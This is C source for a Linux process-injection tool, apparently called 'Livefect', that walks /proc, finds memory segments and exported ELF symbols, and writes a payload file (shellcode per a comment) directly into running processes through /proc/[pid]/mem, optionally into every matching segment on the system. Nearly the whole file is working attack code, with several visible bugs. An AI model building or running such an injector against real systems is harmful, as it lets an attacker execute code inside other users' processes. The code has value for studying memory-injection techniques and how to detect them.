#include <stddef.h>
#include <stdio.h>    
#include <stdlib.h>   
#include <stdbool.h>  

#include <string.h>   //strcmp, strdup, ...

#include <unistd.h>   //pid_t ...
#include <errno.h>    //errno
#include <getopt.h>   //getopt...
#include <fts.h>      //fts_read...
#include <sys/uio.h>  //iovec, process_vm_write/read...
#include <sys/mman.h> //memfd, mmap, etc
#include <fcntl.h>    //open, O_RDONLY, etc
#include <elf.h>      //Elf64_*, Elf32_*

#include <capstone/capstone.h>

#define _GNU_SOURCE 
#define SYMBOL_OPT 1000
#define LIBRARY_OPT 1001
#define DISASM_OPT 1002
#define DISASM_BYTES_OPT 1003

#if defined(__LP64__)
    #define ElfW(type) Elf64_ ## type    
#else
    #define ElfW(type) Elf32_ ## type
#endif

/**Typedefs*/
typedef struct maps_entry {
    void* start;
    void* end;
    char flags[4];
    unsigned long long file_offset;
    uint dev_major;
    uint dev_minor;
    uint inode;
    char path[513];
    struct maps_entry * next;
} maps_entry_t;

typedef struct match {
    pid_t pid;
    char* path;
    char* perms;

    void* start;
    void* end;
    struct match * next;
} match_t;
void match_t_push(match_t** head, pid_t pid, void* start, void* end, char* perms, char* path) {
    //TODO: if head is NULL or has 0 elements, alloc first element and set its values, else perform push.
    if(head == NULL) {
        head[0]=(match_t*)malloc(sizeof(match_t));
        head[0]->start=start;
        head[0]->end=end;
        head[0]->pid=pid;
        head[0]->path=path;
        head[0]->perms=perms;
        head[0]->next=NULL;
        return;
    }
    match_t * new_node = (match_t *) malloc(sizeof(match_t));

    new_node->start = start;
    new_node->end = end;
    new_node->pid = pid;
    new_node->path = strdup(path);
    new_node->perms = strndup(perms, 4);

    new_node->next = *head;
    *head = new_node;
}
typedef struct export {
    pid_t pid;
    char* name;
    void* addr;
    size_t len;
    char* perms;

    struct export * next;
} export_t;
void export_t_push(export_t** head, pid_t pid, char* perms, char* name, void* addr, size_t len) {
    //TODO: if head is NULL or has 0 elements, alloc first element and set its values, else perform push.
    if(head==NULL) {
        head[0]=(export_t*)malloc(sizeof(export_t));
        head[0]->pid=pid;
        head[0]->len=len;
        head[0]->addr=addr;
        head[0]->name=name;
        head[0]->perms=perms;
        head[0]->next=NULL;
        return;
    }
    export_t * new_node = (export_t *) malloc(sizeof(export_t));
    
    new_node->pid = pid;
    new_node->name = strdup(name);
    new_node->addr = addr;
    new_node->len = len;
    new_node->perms = perms;

    new_node->next = *head;
    *head = new_node;
}

/*Prototypes*/
off_t write_payload(pid_t, void*, size_t, void*, bool);
match_t* find_segments(pid_t, char*, match_t*);  
export_t* find_exports(match_t*, bool, export_t*);
void print_usage();

/**Globals*/
const char* program_name;

char* payload = NULL;
size_t payload_len = -1; 

struct iovec remotev[1];        //remote process io vector
struct iovec localv[1];         //local process io vector

/*Arguments*/
pid_t arg_pid = -1;                                     //pid 
char* arg_payload_path;                                 //path to file containing payload
bool arg_list_exports=false, arg_list_maps=false;       //only list exports, only list maps
bool arg_show_usage = false;                            //show help
bool arg_force_disk = false;                            //force lookup of exported symbols from disk
bool arg_skip_root = false;                             //skip root checks
bool arg_inject_all = false;                            //inject payload into ALL matching memory areas 
int arg_verbosity;                                      //verbosity level
int arg_disasm = 0;                                     //instructions to disassemble
int arg_disasm_bytes = 64;                              //bytes to pass to disassemble
void* arg_raddr = NULL;                                 //remote address to write at in case of raw option
char arg_perms[4] = {'r','-','x','*'};  //permissions to look for
bool arg_data_only = false;                             //only show data symbols
bool arg_process_vm = false;                            //attempt writes using process_vm_writev
bool arg_func_only = false;                             //only show func symbols
char* arg_symbol_filter;                                //symbol name to filter for
char* arg_library_filter;                               //library name to filter for

int main(int argc, char* argv[]) {
    /*Work variables*/
    match_t* matches=NULL;
    export_t* exports=NULL;

    program_name = argv[0];

    int opt;
    const char    *short_opts = "hp:emAv:f:a:P:FsDSIV";
    struct option long_opts[] = {
        {"help",          no_argument,             NULL, 'h'},
        {"pid",           required_argument,       NULL, 'p'},
        {"exports",       no_argument,             NULL, 'e'},
        {"maps",          no_argument,             NULL, 'm'},
        {"verbosity",     required_argument,       NULL, 'v'},
        {"file",          required_argument,       NULL, 'f'},
        {"addr",          required_argument,       NULL, 'a'},
        {"perms",         required_argument,       NULL, 'P'},
        {"force",         no_argument,             NULL, 'F'},
        {"skip-root",     no_argument,             NULL, 's'},
       {"data-only",      no_argument,             NULL, 'D'},
       {"func-only",      no_argument,             NULL, 'S'},
       {"inject-all",     no_argument,             NULL, 'I'},
       {"process-vm",     no_argument,             NULL, 'V'},

       {"disasm",         required_argument,       NULL, DISASM_OPT},
       {"disasm-bytes",   required_argument,       NULL, DISASM_BYTES_OPT},

       {"symbol",         required_argument,       NULL, SYMBOL_OPT},
       {"library",         required_argument,       NULL, LIBRARY_OPT},

       {NULL,            0,                       NULL, 0  }
    };

    /*Parse command line options*/
    while ((opt = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) {
        switch (opt) {
            case 'p':
                arg_pid = atoi(optarg);
            break;
            case 'e':
                arg_list_exports = true;
            break;
            case 'm':
                arg_list_maps = true;
            break;
            case 'v':
                arg_verbosity = atoi(optarg);
            break;
            case 'f':
                arg_payload_path = optarg;
            break;
            case 'a':
                arg_raddr = (void*)strtol(optarg, NULL, 0);
            break;
            case 'P':
                if(strlen(optarg)<1) {
                    fprintf(stderr, "[E] Wrong permissions lenght. Use \"rwxp\" (e.g. r-xp).\n");
                    return EXIT_FAILURE;
                }

                for(int i=0;i<strlen(arg_perms);i++) {
                    char c = optarg[i];
                    if(c=='r' || c=='w' || c=='x' || c=='-' || c=='p' || c=='s' || c=='*') {
                        arg_perms[i]=c;
                    } else {
                        fprintf(stderr, "[E] Unknown permission used.\n");
                        return EXIT_FAILURE;
                    }
                }
            break;
            case 'F':
                arg_force_disk = true;
            break;
            case 's':
                arg_skip_root = true;
            break;
            case 'D':
                //mutually exclusive (-D or -S)
                arg_func_only = false;
                arg_data_only = true;
            break;
            case 'S':
                //mutually exclusive (-D or -S)
                arg_data_only = false;
                arg_func_only = true;
            break;
            case 'I':
                arg_inject_all=true;
            break;
            case 'V':
                arg_process_vm=true;
            break;
            case DISASM_OPT: //long only option
                arg_disasm = atoi(optarg);
                arg_list_maps = true;
            break;
            case DISASM_BYTES_OPT: //long only option
                arg_disasm_bytes = atoi(optarg);
                arg_list_maps = true;
            break;
            case SYMBOL_OPT: //long only option
                arg_symbol_filter = optarg;
            break;
            case LIBRARY_OPT: //log only option
                arg_library_filter = optarg;
            break;
            default:
            case 'h':
                arg_show_usage = true;
        }
    }

    /*Quit early conditions*/
    if(arg_show_usage) {
        print_usage();
        return EXIT_SUCCESS;
    }

    if(getuid() != 0 && !arg_skip_root) {
        fprintf(stderr, "[E] Run me as root.\n");
        return EXIT_FAILURE; 
    }

    if(arg_payload_path) {
        int fd = open(arg_payload_path, O_RDONLY);
        if(fd == -1) {
            fprintf(stderr, "[E] Error opening file: %s (errno: %d)\n", arg_payload_path, errno);
            return EXIT_FAILURE;
        }

        payload_len = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET); //rewind

        payload = (char*)malloc(payload_len);
        read(fd, payload, payload_len);
        close(fd);

        printf("[*] Loaded payload from: %s (%lu bytes)\n", arg_payload_path, payload_len);

        //We always use the same payload so source, source size and destination size never change
        localv[0].iov_base = payload;
        localv[0].iov_len = payload_len;
        remotev[0].iov_len = payload_len;
    }

    /*Run*/
    if(arg_raddr) {
        if(arg_pid < 0) {
            fprintf(stderr, "[E] Raw mode can only be used against a sigle pid!\n");
            return EXIT_FAILURE;
        }

        if(payload==NULL) {
            fprintf(stderr, "[E] Must specify payload to write (-f)!\n");
            return EXIT_FAILURE;
        }
        
        //RAW MODE
        if(write_payload(arg_pid, payload, payload_len, arg_raddr, arg_process_vm) == -1) {
            fprintf(stderr, "[E] Failed writing payload. (errno: %d)\n", errno);
            free(payload);
            return EXIT_FAILURE;
        }

        free(payload);
        return EXIT_SUCCESS;
    }

    //We are not running in raw mode, collect matching segments
    printf("[~] Searching interesting segments...\n");
    matches = find_segments(arg_pid, arg_perms, matches);
    if(arg_verbosity>0)
        printf("[~] Collecting exports...\n");
    exports = find_exports(matches, arg_force_disk, exports);

    if(arg_list_maps||arg_list_exports) {
        //Check if we have any results, if so iterate through them
        if(arg_list_maps) {
            if(matches) { 
                match_t* current = matches;
                printf("[=] Found segments:\n");
                while(current) {
                    printf("\t[+] Match (%s) for pid %d @ %s:%p-%p\n", current->perms, current->pid, current->path, current->start, current->end);
                    if(arg_disasm > 0) { 
                        csh handle = 0;
                        cs_insn *insn = NULL;
                        size_t count = 0;
                        struct iovec ioremote[1];        //remote process io vector
                        struct iovec iolocal[1];         //local process io vector

                        void* code_buf = (void*) malloc(arg_disasm_bytes); //this should be read with process_vm_readv

                        ioremote->iov_base=current->start;
                        ioremote->iov_len=arg_disasm_bytes;
                        iolocal->iov_base=code_buf;
                        iolocal->iov_len=arg_disasm_bytes;

                        int nread = process_vm_readv(current->pid, iolocal, 1, ioremote, 1, 0);
                        if(nread==-1) {
                            fprintf(stderr, "\t\t[E] Failed reading %d bytes @ %p from remote process %d. (errno: %d)\n", arg_disasm_bytes, current->start, current->pid, errno);
                            free(code_buf);
                            current = current->next;
                            continue;
                        }
                        
                        if(nread != arg_disasm_bytes) {
                            fprintf(stderr, "\t\t[W] Read bytes mismatch. Read %d bytes out of %d. (errno: %d)\n", nread, arg_disasm_bytes, errno);
                        }

                        //TODO: eventually add support multiple architectures.
                        if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
                            return -1;
                        count = cs_disasm(handle, code_buf, arg_disasm_bytes, 0, arg_disasm, &insn);
                        if (count > 0) {
                            size_t j;
                            for (j = 0; j < count; j++) {
                                printf("\t\t0x%"PRIx64":\t%s\t\t%s\n", (unsigned long)(current->start+insn[j].address), insn[j].mnemonic, insn[j].op_str);
                            }

                            cs_free(insn, count);
                        } else
                            fprintf(stderr, "\t\t[E] Failed to disassemble given code!\n");
                        
                        free(code_buf);
                        cs_close(&handle); 
                    }
                    
                    current = current->next;
                }
            } else {
                printf("[-] No matches found for provided permissions.\n");
                return EXIT_FAILURE;
            }
        }

        if(arg_list_exports){
            if(exports) {
                export_t* current = exports;

                printf("[=] Found exports:\n");
                while(current) {
                    //TODO: fix this, it displays wrong offsets and perms from exports
                    printf("\t[+] Export for pid %d (%s) %s @ %p-%p\n", current->pid, current->perms, current->name, current->addr, current->addr+current->len);
                    current = current->next;
                }
            } else {
                printf("[-] No exports found.\n");
                return EXIT_FAILURE;
            }
        } 

        return EXIT_SUCCESS;
    }

    /*Check if we can do all the bad stuff*/
    if(matches==NULL) {
        printf("[-] No segments found.\n");
        return EXIT_FAILURE;       
    }
    if(exports==NULL && !arg_inject_all) {
        printf("[-] No exports found.\n");
        return EXIT_FAILURE;
    }
    
    /*Do all the bad stuff we can*/
    int injected = 0;
    if(arg_inject_all) {
        fprintf(stderr, "[W] Ignoring exports, injecting into matching memory segments only!\n");
        
        match_t* current_m = matches;
        while(current_m) {
            if(arg_verbosity>0)
                printf("[.] Attempting write of %s (%lu bytes) to PID: %d -> '%s' @ %p...\n", arg_payload_path, payload_len, current_m->pid, current_m->path, current_m->start);
            
            int err = write_payload(current_m->pid, payload, payload_len, current_m->start, arg_process_vm);
            if (err == -1) {
                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current_m->start, errno);
            } else {
                injected++;
            }
            current_m=current_m->next;
        }
    } else if(arg_payload_path != NULL) {
        export_t* current = exports;
        while(current) {
            if(arg_verbosity>0)
                printf("[.] Attempting write of %s (%lu bytes) to PID: %d -> '%s' @ %p...\n", arg_payload_path, payload_len, current->pid, current->name, current->addr);

            int err = write_payload(current->pid, payload, payload_len, current->addr, arg_process_vm);
            if (err == -1) {
                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current->addr, errno);
            } else {
                injected++;
            }

            current=current->next;
        }
    }

    //If we injected to at least 1 process it's a win
    if(injected>0) {
        printf("[*] Yay! Successfully Wrote payload to %d processes!\n", injected);
        return EXIT_SUCCESS;
    } else {
        printf("[-] Boo! No payloads written.\n");
        return EXIT_FAILURE;
    }
}

match_t* find_segments(pid_t pid, char* perms, match_t* matches) {
    FTS *fts;
    FTSENT *entry, *child;
    
    int finds = 0; //matching segments found
    if(strlen(perms) != 4) {
        fprintf(stderr, "[E] Invalid perms (%s) %d\n", perms, (int)strlen(perms));
        return NULL;
    }

    char* proc_path[] = {"/proc/", NULL};
    if((fts=fts_open(proc_path, FTS_LOGICAL, NULL))==NULL) {
        fprintf(stderr, "[E] Error traversing /proc. (errno: %d)", errno);
        exit(EXIT_FAILURE);
    }

    while((entry=fts_read(fts))!=NULL) {
        child = fts_children(fts, 0);
        if(child == NULL) {
            break;
        }

        while (child) {
            switch(child->fts_info) {
                case FTS_D:
                    if(atoi(child->fts_name)!=0) {
                        //We have a valid PID
                        //printf("Entry: %s of type %d\n", child->fts_name, child->fts_info);

                        //Be selective if a pid was specified
                        if(pid>0 && atoi(child->fts_name)!=pid) 
                            break;
                        
                        if(arg_verbosity>1)
                            printf("[+] Found PID: %d\n", atoi(child->fts_name)); 

                        //Construct path
                        char* maps_path = (char*)malloc(strlen("/proc//maps")+entry->fts_namelen+1);
                        sprintf(maps_path, "/proc/%d/maps", atoi(child->fts_name));
                    
                        FILE* f_maps = fopen(maps_path, "r");
                        if(f_maps==NULL) {
                            fprintf(stderr, "[E] Error reading file: %s (errno: %d)\n", maps_path, errno);
                        }

                        //Iterate through /proc/pid/maps
                        size_t line_size = 0;
                        char* line = NULL;

                        //printf("Reading /proc/%d/maps file...\n",atoi(child->fts_name));
                        while(getline(&line, &line_size, f_maps) != -1) {
                            maps_entry_t maps_entry;
                            memset(maps_entry.path,0,513);

                            sscanf(line,"%p-%p %c%c%c%c %Lx %x:%x %x %512c", &maps_entry.start, &maps_entry.end, 
                                                                                       &maps_entry.flags[0],&maps_entry.flags[1],&maps_entry.flags[2],&maps_entry.flags[3], 
                                                                                       &maps_entry.file_offset, 
                                                                                       &maps_entry.dev_major, &maps_entry.dev_minor, 
                                                                                       &maps_entry.inode, maps_entry.path);
                            maps_entry.path[strcspn(maps_entry.path,"\n")] = 0; //NULL terminate path

                            //maps_entries=maps_entry_push(maps_entries, &maps_entry);
                            if(arg_verbosity>1) {
                                printf("\t%s",line);
                            }

                            int matched=0;
                            for(int i=0;i<strlen(perms);i++) {
                                if(perms[i]==maps_entry.flags[i] || perms[i]=='*') {
                                    matched++;
                                }
                            }


                            if(matched == 4) {
                                //printf("\t[+] %d Matching (%c%c%c%c) region found: %p-%p\n", finds, perms[0],perms[1], perms[2], perms[3], last_start, last_end);
                                match_t_push(&matches, atoi(child->fts_name), maps_entry.start, maps_entry.end, maps_entry.flags, maps_entry.path);
                                finds++;
                            }
                        }
                        
                        //free(last_path);
                        free(maps_path);
                        fclose(f_maps);
                    break;
                }
            }
            child = child->fts_link;        
        }
    }
    
    fts_close(fts);
    return matches;
}

export_t* find_exports(match_t* matches, bool from_disk, export_t* exports) {    
    //https://gist.github.com/DhavalKapil/2243db1b732b211d0c16fd5d9140ab0b
    //https://jvns.ca/blog/2018/01/09/resolving-symbol-addresses/
    //https://gist.github.com/tangrs/4030336 

    char* elf_path;
    int fd, finds=0;
    char* buff = NULL;
    size_t buff_len=0;

    match_t* match=matches;
    while(match) {        
        if(from_disk) {
            if(arg_verbosity>4)
                printf("[*] Attempting load of ELF from disk: %s\n", match->path);
            elf_path = match->path;
        } else {
            //if(arg_verbosity>4)
            printf("[W] WIP. Use -F for now! Attempting load of ELF from memory: %p (%lu bytes)\n", match->start, (match->end-match->start));
            // exit(EXIT_FAILURE);

            int c=0;
            int n=match->pid;
            do {
                n /= 10;
                ++c;
            } while (n != 0);

            elf_path = malloc(strlen("/proc//exe")+c);
            sprintf(elf_path, "/proc/%d/exe", match->pid);
        }

        fd = open(elf_path, O_RDONLY);
        if(fd < 0) {
            if(arg_verbosity>2)
                fprintf(stderr, "[E] Error opening file: %s (errno: %d)\n", match->path, errno);
            if(!from_disk) free(elf_path);
            match=match->next;
            continue;
        }

        //Get filesize
        buff_len = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET); //rewind

        buff = (char*)calloc(buff_len, sizeof(char));
        
        //Read all into buff
        int bytes_read=read(fd, buff, buff_len);
        
        //Close file
        close(fd);
       
        if(bytes_read<0) {
            if(arg_verbosity>2)
                fprintf(stderr, "[W] Error: failed reading bytes (char device?) %d.\n", errno);
            free(buff);
            if(!from_disk) free(elf_path);
            match=match->next;
            continue;
        }

        /**Finds exports section in ELF file*/
        ElfW(Ehdr) *header = (ElfW(Ehdr)*)((char *)buff);        
        if(memcmp(header->e_ident,ELFMAG, SELFMAG) != 0) {
            if(arg_verbosity>2)
                fprintf(stderr, "[W] Invalid ELF: %s\n",match->path);
            free(buff);
            if(!from_disk) free(elf_path);
            match=match->next;
            continue;
        }

        //We SHOULD have a valid ELF file
        ElfW(Shdr) *sections = (ElfW(Shdr)*)((char *)buff + header->e_shoff);
        char *section_names = (char *)(buff + sections[header->e_shstrndx].sh_offset); 
        ElfW(Sym) *symtab;
         
        void* local_shoff=buff+header->e_shoff;
        void* remote_shoff=match->start+header->e_shoff;
        
        if(arg_verbosity>3)
            printf("\t[+] Possible %c%c%c%c section header @ [L:%lu][R:%p] (%d entries) for %s\n", buff[0], buff[1], buff[2], buff[3], header->e_shoff, remote_shoff,header->e_shnum, match->path);
        
        for(int i=0; i<header->e_shnum; i++) {
            if(sections[i].sh_type==SHT_SYMTAB || sections[i].sh_type==SHT_DYNSYM) {
                symtab = (ElfW(Sym) *)(buff+sections[i].sh_offset);
                if(arg_verbosity>2)
                    printf("\t[+] Symbols table %s @ [L:%p][R:%p] for %s\n", (section_names+sections[i].sh_name), local_shoff, match->start+sections[i].sh_offset, match->path);
                
                int symbol_num = sections[i].sh_size/sections[i].sh_entsize;
                char *symbol_names = (char *)(buff + sections[sections[i].sh_link].sh_offset);

                for (int j=0; j<symbol_num-1; j++) {
                    if(arg_verbosity>3)
                        printf("\t\t%s Addr: %lx (%lu bytes) [L:%p][R:%p]: \"%s\"\t\n", match->path, symtab[j].st_value, symtab[j].st_size, buff+symtab[j].st_value, match->start+symtab[j].st_value, symbol_names+symtab[j].st_name);
                    
                    /*Filter by symbol/library and st_info type*/
                    //Filter order is important (DATA>FUNC>LIBRARY>SYMBOL)
                    if(arg_data_only && symtab[j].st_info != STT_OBJECT)
                        continue;
                    if(arg_func_only && symtab[j].st_info != STT_FUNC)
                        continue;
                    if(arg_library_filter && strcmp(match->path, arg_library_filter)!=0)
                        continue;
                    if(arg_symbol_filter && strstr(symbol_names+symtab[j].st_name, arg_symbol_filter) == NULL)
                        continue;
                    
                    //TODO: fix this, symbols offsets seem to be of by 0x1000 
                    export_t_push(&exports, match->pid, strdup(match->perms), strdup(symbol_names+symtab[j].st_name), (match->start+symtab[j].st_value), symtab[j].st_size);
                    finds++;
                }
            }
        }

        if(!from_disk)
            free(elf_path);
        free(buff);
        match=match->next;
    }
    return exports;
}

off_t write_payload(pid_t pid, void* payload, size_t payload_len, void* dst, bool process_vm) {
    if(process_vm){
        //TODO: keep the option to force using process_vm_writev, even if not as effective. Add command line flag.
        fprintf(stderr, "[E] Feature not implemented yet.\n");
        return -2;
    }

    //We basically doing this: sudo dd seek=$((0x7ff5c451d109)) bs=1B if=shellcodes/shellcode_demo of=/proc/12443/mem
    if(pid<1) {
        fprintf(stderr, "[E] Invalid PID: %d\n", pid);
        return -1;
    }

    //Count digits
    int c=0;
    int n=pid;
    do {
        n /= 10;
        ++c;
    } while (n != 0);

    //Construct path
    char* memfd_path = (char*)malloc(strlen("/proc//mem")+c+1);
    sprintf(memfd_path, "/proc/%ld/mem", (unsigned long) pid);

    //Open, seek, write
    int memfd = open(memfd_path, O_WRONLY|O_RDONLY);
    if(memfd == -1) {
        fprintf(stderr, "[E] Failed to open '%s' (errno: %d)\n", memfd_path, errno);
        return -1;
    }

    printf("[*] Seeking @ %d (%p)\n", (int)lseek(memfd, (off_t)dst,SEEK_SET), dst);
    int err = (int)write(memfd, payload, payload_len);
    close(memfd);

    if(err != -1)
        printf("[*] Wrote %d bytes\n", err);
    else
        return -1;

    return 0;
}

void print_usage() {
    printf("Livefect = Infect live, running processes\n");

    printf("Usage: %s [opts]\n", program_name);
    printf("\t-h --help:              show this help message\n");
    
    printf("\t-V --process-vm:        use process_vm_writev instead of /proc/[pid]/mem\n");
    printf("\t-p --pid PID:           run against specified pid (default: NULL)\n");
    printf("\t-f --file FILE:         file containing data to write/payload (default: NULL)\n");
    printf("\t-a --addr ADDR:         (raw mode) address to write data/payload to\n");
    printf("\t-v --verbosity LEVEL:   set verbosity level (default: 0)\n");
    printf("\t-P --perms PERMS:       which permissions to look for (default: rwxp)\n");
    printf("\t-S --func-only:         only display function symbols\n");
    printf("\t   --symbol SYMBOL:     write FILE to all symbols with name SYMBOL\n");
    printf("\t   --library LIBRARY:   to use with --symbol allow write to specific SYMBOL from specific LIBRARY\n");
    printf("\t-D --data-only:         only display data symbols\n");
    printf("\t-I --inject-all:        (potentially unsafe) force payload injection in any matching memory area\n");

    printf("\t-m --maps:              only list memory maps\n");
    printf("\t   --disasm N:          (implies -m) try disassemble the first N instructions and show output (default: 0)\n");
    printf("\t   --disasm-bytes N:    (implies -m) bytes to pass to disassembler (default: 64)\n");

    printf("\t-e --exports:           only list exported functions\n");
    printf("\t-F --force-disk:        force ELF exports lookup from disk\n");

    printf("\t-s --skip-root:         do not enforce root checks\n");
    
    //TODO: check if there's a process_vm_mmap or similar to change maps permissions before writing and add option to do so
    //https://man7.org/linux/man-pages/man2/pidfd_open.2.html
    //https://lwn.net/Articles/830648/
    printf("\nMade while screaming in *PANIC* by @thatsn0mysite (https://thatsn0tmy.site)\n");
}